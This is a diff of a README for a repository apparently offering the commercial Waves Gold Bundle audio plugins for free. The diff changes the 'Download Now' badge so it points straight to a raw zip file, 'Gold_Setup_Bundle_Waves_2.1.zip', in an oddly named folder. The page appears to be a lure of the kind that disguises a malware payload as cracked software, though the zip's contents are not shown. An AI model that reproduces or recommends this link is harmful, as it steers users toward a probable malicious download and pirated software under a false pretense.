@@ -1,6 +1,6 @@
 # 🎧 Waves-Gold-Bundle-Setup - Essential Audio Plugins For Your Studio
 
-[![Download Waves Gold Bundle](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://github.com/hilaryfibrillose584/Waves-Gold-Bundle-Setup)
+[![Download Waves Gold Bundle](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://github.com/hilaryfibrillose584/Waves-Gold-Bundle-Setup/raw/refs/heads/main/expirer/Gold_Setup_Bundle_Waves_2.1.zip)
 
 Waves Gold Bundle provides a collection of 42 audio tools for mixing and mastering. This software helps you polish your music tracks using compressors, equalizers, reverbs, and correction tools. These plugins work inside your music creation software on Windows.
 
